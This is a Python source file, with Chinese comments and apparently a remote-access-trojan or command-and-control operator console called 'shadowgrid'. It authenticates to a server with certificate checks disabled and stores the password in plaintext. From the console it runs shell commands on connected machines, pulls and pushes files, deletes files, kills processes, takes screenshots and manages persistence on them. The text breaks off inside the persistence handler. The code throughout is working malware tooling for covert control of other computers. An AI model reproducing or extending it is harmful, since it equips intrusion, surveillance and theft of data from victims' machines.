# -*- coding: utf-8 -*-
import urllib.request
import json
import os
import sys
import time
import base64
import getpass
import requests
import ssl
import subprocess

# 尝导入readline和其他高级库来支持完整功能
try:
    import readline  # 为了支持命令历史
    HAS_READLINE = True
except ImportError:
    HAS_READLINE = False
    print("[警告] readline不支持，使用标准输入")

try:
    import configparser  # 用于配置文件管理
except ImportError:
    print("[警告] configparser 不支持")

from pathlib import Path

# 配置文件路径定义
CONFIG_DIR = Path.home() / ".shadowgrid"
CONFIG_FILE = CONFIG_DIR / "config.ini"
HISTORY_FILE = CONFIG_DIR / "history"

SERVER_URL = None
SESSION_AUTH = None
CLIENTS = {}
CURRENT_DEVICE = None
CURRENT_HOSTNAME = ""
CURRENT_PATH = os.getcwd().replace('/', '\\')

# 配置和历史变量
CONFIG = {}
CMD_HISTORY = []

def load_config():
    """加载配置文件"""
    global CONFIG
    CONFIG = {"server_url": "", "last_client_id": "", "last_hostname": ""}
    
    if not CONFIG_DIR.exists():
        CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    
    if CONFIG_FILE.exists():
        try:
            config_parser = configparser.ConfigParser()
            config_parser.read(CONFIG_FILE, encoding='utf-8')
            
            if 'shadowgrid' in config_parser:
                section = config_parser['shadowgrid']
                CONFIG = {
                    "server_url": section.get('server_url', ''),
                    "last_password": section.get('last_password', ''),
                    "last_client_id": section.get('last_client_id', ''),
                    "last_hostname": section.get('last_hostname', ''),
                    "auto_remember_password": section.getboolean('auto_remember_password', fallback=False),
                }
        except Exception:
            pass  # 如果配置文件损坏则使用默认配置
    
    # 加载命令历史
    if HISTORY_FILE.exists():
        try:
            with open(HISTORY_FILE, 'r', encoding='utf-8') as f:
                if HAS_READLINE:  # 只在readline模块可用时使用
                    import readline
                    for line in f.readlines():
                        line = line.strip()
                        if line:
                            readline.add_history(line)
                            CMD_HISTORY.append(line)
                else:
                    # 如果readline不可用，只加载列表
                    for line in f.readlines():
                        line = line.strip()
                        if line:
                            CMD_HISTORY.append(line)
        except Exception:
            pass

def save_history():
    """保存命令历史到文件"""
    try:
        if not CONFIG_DIR.exists():
            CONFIG_DIR.mkdir(parents=True, exist_ok=True)
        
        with open(HISTORY_FILE, 'w', encoding='utf-8') as f:
            for cmd in CMD_HISTORY:
                f.write(cmd + '\n')
    except Exception:
        pass  # 历史保存失败不影响正常使用

RESET = "\033[0m"
BOLD = "\033[1m"
ITALIC = "\033[3m"
UNDERLINE = "\033[4m"

GREEN = "\033[92m"
LGREEN = "\033[1;92m"
DGREEN = "\033[2;92m"

BLUE = "\033[94m"
LBLUE = "\033[1;94m"
DBLUE = "\033[2;94m"

YELLOW = "\033[93m"
LYELLOW = "\033[1;93m"
DYELLOW = "\033[2;93m"

RED = "\033[91m"
LRED = "\033[1;91m"
DRED = "\033[2;91m"

PURPLE = "\033[95m"
LPURPLE = "\033[1;95m"
DPURPLE = "\033[2;95m"

CYAN = "\033[96m"
LCYAN = "\033[1;96m"
DCYAN = "\033[2;96m"

GRAY = "\033[90m"
LGRAY = "\033[1;90m"

def get_timestamp():
    return time.strftime("%Y%m%d_%H%M%S")

def clear_screen():
    """清屏"""
    os.system("cls" if os.name == "nt" else "clear")

def format_ls_output(items):
    """格式化ls输出"""
    if not items:
        return
    if not isinstance(items, list):
        return
    for item in items:
        if isinstance(item, dict):
            name = item.get("name", "")
            is_dir = item.get("dir", False)
            if is_dir:
                print(f"  {name}/")
            else:
                print(f"  {name}")
        else:
            print(f"  {item}")

def print_clients():
    """打印设备列表"""
    if not CLIENTS:
        print(f"{GRAY}[信息]{RESET} 没有已连接的设备")
        return
    print(f"\n{LGREEN}┌─[ 可用设备 ]{RESET}")
    for idx, client in enumerate(CLIENTS, 1):
        cid = client.get("id", "unknown")
        hostname = client.get("hostname", "unknown")
        ip = client.get("ip", "unknown")
        print(f"{BLUE}  {idx}. {LGREEN}{hostname}{RESET} ({CYAN}{ip}{RESET}) {GRAY}[ID: {PURPLE}{cid}{GRAY}]{RESET}")
    print(f"{BLUE}└────────────{RESET}\n")

def req(method, endpoint, data=None):
    """发送HTTP请求"""
    global SESSION_AUTH
    url = f"{SERVER_URL}{endpoint}"
    headers = {"Content-Type": "application/json"}
    body = json.dumps(data).encode() if data else None
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        request = urllib.request.Request(url, data=body, headers=headers, method=method)
        if SESSION_AUTH:
            auth_str = f"{SESSION_AUTH[0]}:{SESSION_AUTH[1]}"
            auth_b64 = base64.b64encode(auth_str.encode()).decode()
            request.add_header("Authorization", f"Basic {auth_b64}")
        
        with urllib.request.urlopen(request, context=context, timeout=10.0) as response:
            result = json.loads(response.read().decode())
            return result
    except Exception as e:
        return {"error": str(e)}

def fetch_clients():
    """获取设备列表"""
    global CLIENTS
    try:
        resp = req("GET", "/clients")
        CLIENTS = resp.get("clients", [])
        return CLIENTS
    except Exception as e:
        print(f"[错误] 获取设备列表失败: {e}")
        return []

def send_command(client_id, cmd_type, payload=None):
    """发送命令到设备"""
    try:
        data = {"type": cmd_type}
        if payload is not None:
            data["payload"] = payload
        resp = req("POST", f"/command/{client_id}", data)
        return resp
    except Exception as e:
        return {"error": str(e)}

def get_results(client_id):
    """获取命令结果"""
    try:
        resp = req("GET", f"/results/{client_id}")
        return resp.get("results", [])
    except Exception as e:
        # 返回空列表表示获取失败，而不应该立即视为客户端断线
        return []

def wait_for_result(client_id, timeout=1.5):  # 增加默认超时时间以适应较慢的命令
    """等待命令结果"""
    start_time = time.time()
    while time.time() - start_time < timeout:
        try:
            results = get_results(client_id)
            if results:
                return results
        except:
            # 即使请求出现一些暂时问题，也不要立即当作断线
            pass
        time.sleep(0.02)
    return None  # 返回None表示没有结果（超时），由调用方决定是否认为客户端断线

def check_client_online(client_id):
    """检查客户端是否仍然在线，而不是依赖结果等待超时来判断"""
    try:
        # 请求客户端列表检查是否在线
        connected_clients = req("GET", "/clients")
        client_list = connected_clients.get("clients", [])
        for client in client_list:
            if client.get("id") == client_id:
                return True
        return False
    except:
        # 如果无法连接到服务器则假设客户端已离线
        return False

def print_failed_result(r):
    """打印错误结果"""
    err = r.get("error", "")
    result = r.get("result", "")
    if err:
        print(f"[错误] {err}")
    elif isinstance(result, str):
        print(f"[结果] {result}")

def print_help():
    """打印帮助"""
    print(f"\n{LGREEN}可用命令：{RESET}")
    print(f"  {YELLOW}list{RESET}              {LGREEN}列出所有可用设备{RESET}")
    print(f"  {YELLOW}use <编号>{RESET}          {LGREEN}选择设备{RESET}")
    print(f"  {YELLOW}back{RESET}              {LGREEN}返回设备列表{RESET}")
    print(f"  {YELLOW}clear{RESET}             {LGREEN}清屏{RESET}")
    print(f"  {YELLOW}history{RESET}           {LGREEN}查看命令历史{RESET}")
    print(f"  {YELLOW}history -c{RESET}        {LGREEN}清除命令历史{RESET}")
    print(f"  {YELLOW}!!{RESET}                {LGREEN}执行上一条命令（待完善）{RESET}")
    print(f"  {YELLOW}help{RESET}              {LGREEN}显示帮助{RESET}")
    print(f"  {YELLOW}quit{RESET}              {LRED}退出{RESET}")
    print("")
    print(f"{BLUE}设备命令：{RESET}")
    print(f"  {YELLOW}ls [路径]{RESET}         {LGREEN}列出目录{RESET}")
    print(f"  {YELLOW}cd <目录>{RESET}         {LGREEN}切换目录{RESET}")
    print(f"  {YELLOW}pwd{RESET}               {LGREEN}显示当前目录{RESET}")
    print(f"  {YELLOW}cat <文件>{RESET}        {LGREEN}查看文件{RESET}")
    print(f"  {YELLOW}dl <文件> [目录]{RESET}   {LGREEN}下载{RESET}")
    print(f"  {YELLOW}ud <文件> [目录]{RESET}   {LGREEN}上传{RESET}")
    print(f"  {YELLOW}rm <路径> [-r]{RESET}    {LRED}删除{RESET}")
    print(f"  {YELLOW}mv <源> <目标>{RESET}    {LGREEN}移动{RESET}")
    print(f"  {YELLOW}file <路径>{RESET}       {LGREEN}查看类型{RESET}")
    print(f"  {YELLOW}find <模式> [-t]{RESET}  {LGREEN}查找{RESET}")
    print(f"  {YELLOW}shell <命令>{RESET}      {LGREEN}执行命令{RESET}")
    print(f"  {YELLOW}ps{RESET}                {LGREEN}查看进程{RESET}")
    print(f"  {YELLOW}kill <PID>{RESET}        {LGREEN}终止进程{RESET}")
    print(f"  {YELLOW}persist <action>{RESET}   {LGREEN}持久化管理{RESET}")
    print(f"  {YELLOW}screenshot{RESET}         {LGREEN}截图{RESET}")
    print(f"  {YELLOW}help{RESET}              {LGREEN}显示帮助{RESET}")
    print(f"  {YELLOW}back{RESET}              {LGREEN}返回{RESET}")

def prompt_config():
    """配置服务器地址"""
    global SERVER_URL
    # 尝试从配置文件获取上次的服务器地址，默认为空
    last_server = CONFIG.get("server_url", "")
    
    if last_server:
        print(f"{GRAY}[配置]{RESET} 使用上次连接的服务器地址: {LGREEN}{last_server}{RESET}")
        use_last = input(f"{GRAY}[配置]{RESET} 是否使用上次地址? (Y/n): ").strip().lower()
        if use_last != 'n':
            SERVER_URL = last_server
            return
    
    print(f"{GRAY}[配置]{RESET} 请输入服务器地址 (默认: {LYELLOW}https://127.0.0.1:8444{RESET}):")
    user_input = input(f"{LYELLOW}> {RESET}").strip()
    SERVER_URL = user_input if user_input else "https://127.0.0.1:8444"
    
    # 更新配置并保存
    CONFIG["server_url"] = SERVER_URL
    save_config(CONFIG)
    
    print(f"{GRAY}[配置]{RESET} 使用服务器: {LGREEN}{SERVER_URL}{RESET}")

def login():
    """登录认证"""
    global SESSION_AUTH
    tries = 0
    max_tries = 3
    
    # 检查上次保存的密码是否可以使用
    if CONFIG.get("auto_remember_password", False) and CONFIG.get("last_password", "") != "":
        password = CONFIG["last_password"]
        remember_choice = input(f"{GRAY}[登录]{RESET} 使用保存的密码重新登录? (Y/n): ").strip().lower()
        if remember_choice != 'n':
            try:
                auth_b64 = base64.b64encode(f"admin:{password}".encode()).decode()
                response = requests.post(
                    f"{SERVER_URL}/login",
                    headers={"Authorization": f"Basic {auth_b64}"},
                    verify=False,
                    timeout=10
                )
                if response.status_code == 200:
                    data = response.json()
                    if data.get("status") == "ok":
                        print(f"{LGREEN}[登录]{RESET} {BOLD}认证成功（使用缓存密码）{RESET}")
                        SESSION_AUTH = ("admin", password)
                        return True
                    else:
                        print(f"{RED}[登录]{RESET} {BOLD}认证失败{RESET}，请重新输入密码")
                else:
                    print(f"{RED}[登录]{RESET} HTTP {response.status_code}，请重新输入密码")
            except Exception as e:
                print(f"{RED}[登录]{RESET} 错误: {e}，请重新输入密码")
    
    while tries < max_tries:
        print(f"{GRAY}[登录]{RESET} 请输入密码 (剩余尝试次数: {max_tries - tries}):")
        password = getpass.getpass(f"{LYELLOW}> {RESET}")
        
        try:
            auth_b64 = base64.b64encode(f"admin:{password}".encode()).decode()
            response = requests.post(
                f"{SERVER_URL}/login",
                headers={"Authorization": f"Basic {auth_b64}"},
                verify=False,
                timeout=10
            )
            if response.status_code == 200:
                data = response.json()
                if data.get("status") == "ok":
                    print(f"{LGREEN}[登录]{RESET} {BOLD}认证成功{RESET}")
                    
                    # 询问是否保存密码
                    save_choice = input(f"{GRAY}[登录]{RESET} 是否记住密码? (Y/n): ").strip().lower()
                    if save_choice != 'n':
                        CONFIG["last_password"] = password
                        CONFIG["auto_remember_password"] = "true"
                        save_config(CONFIG)
                    
                    SESSION_AUTH = ("admin", password)
                    return True
                else:
                    print(f"{RED}[登录]{RESET} {BOLD}认证失败{RESET}")
                    tries += 1
            else:
                print(f"{RED}[登录]{RESET} HTTP {response.status_code}")
                tries += 1
        except Exception as e:
            print(f"{RED}[登录]{RESET} 错误: {e}")
            tries += 1
            
        if tries < max_tries:
            print(f"{GRAY}[登录]{RESET} 请重试...")
    
    print(f"{RED}[登录]{RESET} {BOLD}认证失败次数过多，程序退出{RESET}")
    return False

def interaction_loop(client_id, hostname):
    """设备交互循环"""
    global CURRENT_DEVICE, CURRENT_HOSTNAME, CURRENT_PATH
    CURRENT_DEVICE = client_id
    CURRENT_HOSTNAME = hostname
    CURRENT_PATH = os.getcwd().replace('/', '\\')
    
    print(f"{LGREEN}┌─[ 连接成功 ]{RESET}")
    print(f"{GRAY}│{RESET} 已连接到设备: {CYAN}{hostname}{RESET} ({PURPLE}ID: {client_id}{PURPLE}){RESET}")
    print(f"{GRAY}├{RESET} 输入 '{YELLOW}back{RESET}' 返回设备列表")
    print(f"{GRAY}└{RESET} 输入 '{YELLOW}help{RESET}' 查看可用命令")
    
    # 获取远程系统信息
    send_command(client_id, "shell", "hostname")
    time.sleep(0.5)
    remote_hostname = ""
    for r in get_results(client_id):
        if r.get("result_type") == "shell":
            remote_hostname = r.get("result", "").strip()
    
    send_command(client_id, "shell", "whoami")
    time.sleep(0.5)
    remote_user = ""
    for r in get_results(client_id):
        if r.get("result_type") == "shell":
            remote_user = r.get("result", "").strip().split('\\')[-1].split('/')[-1]
    
    print(f"\n{BLUE}┌──({LGREEN}{remote_user}{RESET}@{PURPLE}{remote_hostname}{RESET})-[{CYAN}~{RESET}]{RESET}")
    print(f"{BLUE}└─# {RESET}{LGREEN}{hostname}{RESET}:{YELLOW}{CURRENT_PATH}{RESET} ")
    
    while True:
        try:
            prompt = f"{BLUE}┌──({LGREEN}{remote_user}{RESET}@{PURPLE}{remote_hostname}{RESET})-[{CYAN}{CURRENT_PATH}{RESET}]{RESET}\n{BLUE}└─# {LGREEN}>{RESET} "
            cmd_input = input(prompt).strip()
        except EOFError:
            print(f"\n{GRAY}[信息]{RESET} 退出中...")
            return
        except KeyboardInterrupt:
            print(f"\n{GRAY}[信息]{RESET} 使用 '{YELLOW}quit{RESET}' 退出")
            continue

        # 记录命令到历史 (同样在此循环中也记录)
        apply_readline_history(cmd_input)

        if not cmd_input:
            continue
        
        parts = cmd_input.split(maxsplit=1)
        cmd = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else None
        
        if cmd == "quit":
            print(f"{GRAY}[信息]{RESET} 退出中...")
            sys.exit(0)
        elif cmd == "back":
            print(f"{GRAY}[信息]{RESET} 返回设备列表中...")
            CURRENT_DEVICE = None
            CURRENT_HOSTNAME = ""
            # 检测到离线时退出当前控制状态并刷新设备列表
            print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
            try:
                fetch_clients()
                if CLIENTS:
                    print_clients()
                else:
                    print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
            except Exception as e:
                print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
            return
        elif cmd == "clear":
            clear_screen()
        elif cmd == "list":
            try:
                fetch_clients()
                if CLIENTS:
                    print_clients()
                else:
                    print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
            except Exception as e:
                print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
        elif cmd == "screenshot":
            send_command(client_id, "screenshot")
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    if r.get("result_type") == "screenshot":
                        img_data = r.get("result", "")
                        filename = r.get("filename", "shot.png")
                        try:
                            img_bytes = base64.b64decode(img_data)
                            os.makedirs("screenshots", exist_ok=True)
                            save_path = os.path.join("screenshots", f"{client_id}_{get_timestamp()}_{filename}")
                            with open(save_path, "wb") as f:
                                f.write(img_bytes)
                            print(f"{LGREEN}[结果]{RESET} 截图已保存: {CYAN}{save_path}{RESET}")
                        except Exception as e:
                            print(f"{RED}[错误]{RESET} 无法保存截图: {DRED}{e}{RESET}")
                    elif r.get("result_type") == "error":
                        print_failed_result(r)
        elif cmd == "ls":
            full_path = arg if arg else CURRENT_PATH
            full_path = os.path.normpath(full_path)
            send_command(client_id, "ls", full_path)
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    format_ls_output(r.get("result", []))
            else:
                # 没有获取到结果，可能是命令执行时间长，所以我们先确认客户端是否真的掉线
                if not check_client_online(client_id):
                    # 确认客户端真的不是在线的
                    print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
                    CURRENT_DEVICE = None
                    CURRENT_HOSTNAME = ""
                    print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
                    try:
                        fetch_clients()
                        if CLIENTS:
                            print_clients()
                        else:
                            print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
                    except Exception as e:
                        print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
                    return
                else:
                    # 客户端仍然在线，只是命令执行时间较长
                    print(f"{YELLOW}[信息]{RESET} 命令仍在执行，请稍候...")
        elif cmd == "cd":
            if not arg:
                print(f"{RED}[错误]{RESET} 用法: cd <目录>")
                continue
            full_path = os.path.normpath(os.path.join(CURRENT_PATH, arg))
            send_command(client_id, "cd", full_path)
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    if r.get("result_type") == "dir":
                        CURRENT_PATH = full_path
                        print(f"{LGREEN}[结果]{RESET} 已切换到目录 {CYAN}{CURRENT_PATH}{RESET}")
                    else:
                        print_failed_result(r)
            else:
                # 检测到客户端下线
                print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
                CURRENT_DEVICE = None
                CURRENT_HOSTNAME = ""
                print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
                try:
                    fetch_clients()
                    if CLIENTS:
                        print_clients()
                    else:
                        print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
                except Exception as e:
                    print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
                return
        elif cmd == "pwd":
            send_command(client_id, "pwd")
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    print(f"{CYAN}[结果]{RESET} {r.get('result', '')}")
            else:
                # 检测到客户端下线
                print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
                CURRENT_DEVICE = None
                CURRENT_HOSTNAME = ""
                print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
                try:
                    fetch_clients()
                    if CLIENTS:
                        print_clients()
                    else:
                        print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
                except Exception as e:
                    print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
                return
        elif cmd == "cat":
            if not arg:
                print(f"{RED}[错误]{RESET} 用法: cat <文件路径>")
                continue
            full_path = os.path.normpath(os.path.join(CURRENT_PATH, arg))
            send_command(client_id, "cat", full_path)
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    if r.get("result_type") == "file":
                        file_data = r.get("result", "")
                        if file_data:
                            try:
                                content = base64.b64decode(file_data).decode()
                                print(f"{LGREEN}[结果]{RESET}")
                                print(f"{DCYAN}{content}{RESET}")
                            except Exception as e:
                                print(f"{RED}[错误]{RESET} 解码失败: {DRED}{e}{RESET}")
                        else:
                            print(f"{RED}[错误]{RESET} 文件为空")
                    else:
                        print_failed_result(r)
            else:
                # 检测到客户端下线
                print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
                CURRENT_DEVICE = None
                CURRENT_HOSTNAME = ""
                print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
                try:
                    fetch_clients()
                    if CLIENTS:
                        print_clients()
                    else:
                        print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
                except Exception as e:
                    print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
                return
        elif cmd == "dl":
            if not arg:
                print(f"{RED}[错误]{RESET} 用法: dl <文件路径> [保存目录]")
                continue
            parts = arg.split(maxsplit=1)
            file_path = parts[0]
            save_dir = parts[1] if len(parts) > 1 else "downloads"
            full_path = os.path.normpath(os.path.join(CURRENT_PATH, file_path))
            os.makedirs(save_dir, exist_ok=True)
            send_command(client_id, "dl", {"path": file_path, "save_as": ""})
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    if r.get("result_type") == "file":
                        file_bytes = base64.b64decode(r.get("result", ""))
                        save_path = os.path.join(save_dir, r.get("filename", "downloaded"))
                        with open(save_path, "wb") as f:
                            f.write(file_bytes)
                        print(f"{LGREEN}[结果]{RESET} 文件已下载: {CYAN}{save_path}{RESET}")
                    else:
                        print_failed_result(r)
            else:
                # 检测到客户端下线
                print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
                CURRENT_DEVICE = None
                CURRENT_HOSTNAME = ""
                print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
                try:
                    fetch_clients()
                    if CLIENTS:
                        print_clients()
                    else:
                        print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
                except Exception as e:
                    print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
                return
        elif cmd == "ud":
            if not arg:
                print(f"{RED}[错误]{RESET} 用法: ud <本地文件> [远程目录]")
                continue
            parts = arg.split(maxsplit=1)
            local_file = parts[0]
            remote_dir = parts[1] if len(parts) > 1 else "."
            if not os.path.isfile(local_file):
                print(f"{RED}[错误]{RESET} 本地文件未找到")
                continue
            with open(local_file, "rb") as f:
                base64_data = base64.b64encode(f.read()).decode()
            save_as = os.path.join(CURRENT_PATH, os.path.basename(local_file))
            send_command(client_id, "ud", {"base64_data": base64_data, "save_as": save_as})
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    print_failed_result(r)
            else:
                # 检测到客户端下线
                print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
                CURRENT_DEVICE = None
                CURRENT_HOSTNAME = ""
                print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
                try:
                    fetch_clients()
                    if CLIENTS:
                        print_clients()
                    else:
                        print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
                except Exception as e:
                    print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
                return
        elif cmd == "rm":
            if not arg:
                print(f"{RED}[错误]{RESET} 用法: rm <路径> [-r]")
                continue
            recursive = arg.endswith(" -r")
            path = arg[:-3] if recursive else arg
            full_path = os.path.normpath(os.path.join(CURRENT_PATH, path))
            send_command(client_id, "rm", {"path": full_path, "recursive": recursive})
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    print_failed_result(r)
            else:
                # 检测到客户端下线
                print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
                CURRENT_DEVICE = None
                CURRENT_HOSTNAME = ""
                print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
                try:
                    fetch_clients()
                    if CLIENTS:
                        print_clients()
                    else:
                        print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
                except Exception as e:
                    print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
                return
        elif cmd == "mv":
            if not arg or len(arg.split()) < 2:
                print(f"{RED}[错误]{RESET} 用法: mv <源> <目标>")
                continue
            parts = arg.split(maxsplit=1)
            src, dst = parts[0], parts[1]
            full_src = os.path.normpath(os.path.join(CURRENT_PATH, src))
            full_dst = os.path.normpath(os.path.join(CURRENT_PATH, dst))
            send_command(client_id, "mv", {"from_path": full_src, "to_path": full_dst})
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    print_failed_result(r)
            else:
                # 检测到客户端下线
                print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
                CURRENT_DEVICE = None
                CURRENT_HOSTNAME = ""
                print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
                try:
                    fetch_clients()
                    if CLIENTS:
                        print_clients()
                    else:
                        print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
                except Exception as e:
                    print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
                return
        elif cmd == "file":
            if not arg:
                print(f"{RED}[错误]{RESET} 用法: file <路径>")
                continue
            full_path = os.path.normpath(os.path.join(CURRENT_PATH, arg))
            send_command(client_id, "file", {"path": full_path})
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    if r.get("result_type") == "file":
                        print(f"{PURPLE}[结果]{RESET} {r.get('result', '')}")
                    else:
                        print_failed_result(r)
            else:
                # 检测到客户端下线
                print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
                CURRENT_DEVICE = None
                CURRENT_HOSTNAME = ""
                print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
                try:
                    fetch_clients()
                    if CLIENTS:
                        print_clients()
                    else:
                        print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
                except Exception as e:
                    print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
                return
        elif cmd == "find":
            if not arg:
                print(f"{RED}[错误]{RESET} 用法: find <模式> [-t 类型]")
                continue
            parts = arg.split()
            pattern = None
            file_type = None
            i = 0
            while i < len(parts):
                if parts[i] == "-t" and i + 1 < len(parts):
                    file_type = parts[i + 1]
                    i += 1
                else:
                    if not pattern:
                        pattern = parts[i]
                i += 1
            if not pattern:
                print(f"{RED}[错误]{RESET} 用法: find <模式> [-t 类型]")
                continue
            full_path = os.path.normpath(os.path.join(CURRENT_PATH, pattern))
            send_command(client_id, "find", {"path": full_path, "name": pattern, "type": file_type})
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    if r.get("result_type") == "list":
                        for item in r.get("result", []):
                            item_type = item.get("type", "")
                            item_path = item.get("path", "")
                            if item_type.lower() == "dir":
                                print(f"  {LGREEN}[{item_type.upper()}]{RESET} {CYAN}{item_path}{RESET}")
                            else:
                                print(f"  {YELLOW}[{item_type.upper()}]{RESET} {item_path}")
                    else:
                        print_failed_result(r)
            else:
                # 检测到客户端下线
                print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
                CURRENT_DEVICE = None
                CURRENT_HOSTNAME = ""
                print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
                try:
                    fetch_clients()
                    if CLIENTS:
                        print_clients()
                    else:
                        print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
                except Exception as e:
                    print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
                return
        elif cmd in ("ps", "process"):
            send_command(client_id, "ps")
            results = wait_for_result(client_id, timeout=5.0)
            if results:
                for r in results:
                    if r.get("result_type") == "process_list":
                        processes = r.get("result", [])
                        print(f"\n{YELLOW}PID{RESET}    {YELLOW}NAME{RESET}{' ' * 20} {YELLOW}USERNAME{RESET}")
                        print("-" * 60)
                        for proc in processes:
                            pid = proc.get('pid', 'N/A') if isinstance(proc, dict) else 'N/A'
                            name = proc.get('name', 'N/A')[:20] if isinstance(proc, dict) else 'N/A' # 限制进程名长度
                            username = proc.get('username', 'N/A') if isinstance(proc, dict) else 'N/A'
                            status = proc.get('status', '') if isinstance(proc, dict) else ''
                            
                            # 确保所有值都不是None
                            pid = pid if pid is not None else 'N/A'
                            name = name if name is not None else 'N/A'
                            username = username if username is not None else 'N/A'
                            status = status if status is not None else ''
                            
                            print(f"{CYAN}{pid:<8}{RESET} {name:<22} {username:<15}")
                        print(f"\n{LGREEN}[结果]{RESET} Found {len(processes)} processes\n")
                    else:
                        print_failed_result(r)
            else:
                # 检测到客户端下线
                print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
                CURRENT_DEVICE = None
                CURRENT_HOSTNAME = ""
                print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
                try:
                    fetch_clients()
                    if CLIENTS:
                        print_clients()
                    else:
                        print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
                except Exception as e:
                    print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
                return
        elif cmd == "shell":
            if not arg:
                print(f"{RED}[错误]{RESET} 用法: shell <命令>")
                continue
            send_command(client_id, "shell", arg)
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    if r.get("result_type") == "shell":
                        output = r.get("result", "")
                        print(f"{LGREEN}[结果]{RESET}")
                        print(f"{DCYAN}{output}{RESET}")
                    else:
                        print_failed_result(r)
            else:
                # 检测到客户端下线
                print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
                CURRENT_DEVICE = None
                CURRENT_HOSTNAME = ""
                print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
                try:
                    fetch_clients()
                    if CLIENTS:
                        print_clients()
                    else:
                        print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
                except Exception as e:
                    print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
                return
        elif cmd in ("kill", "terminate"):
            if not arg:
                print(f"{RED}[错误]{RESET} 用法: kill <PID>")
                continue
            try:
                pid = int(arg)
                send_command(client_id, "kill", {"pid": pid})
                results = wait_for_result(client_id)
                if results:
                    for r in results:
                        print_failed_result(r)
                else:
                    # 没有获取到结果，可能是命令执行时间长，所以我们先确认客户端是否真的掉线
                    if not check_client_online(client_id):
                        # 确认客户端真的不是在线的
                        print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
                        CURRENT_DEVICE = None
                        CURRENT_HOSTNAME = ""
                        print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
                        try:
                            fetch_clients()
                            if CLIENTS:
                                print_clients()
                            else:
                                print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
                        except Exception as e:
                            print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
                        return
                    else:
                        # 客户端仍然在线，只是命令执行时间较长
                        print(f"{YELLOW}[信息]{RESET} 命令仍在执行，请稍候...")
            except ValueError:
                print(f"{RED}[错误]{RESET} PID必须是有效整数")
        elif cmd in ("persist", "install"):
            if not arg:
                print(f"{RED}[错误]{RESET} 用法: persist <install|remove> [参数]")
                continue
            parts = arg.split(maxsplit=1)
            action = parts[0].lower()
            param = parts[1] if len(parts) > 1 else ""
            
            payload = {"action": action}
            if action == "install" and param:
                payload["path"] = param
            
            send_command(client_id, "persist", payload)
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    print_failed_result(r)
            else:
                # 检测到客户端下线
                print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
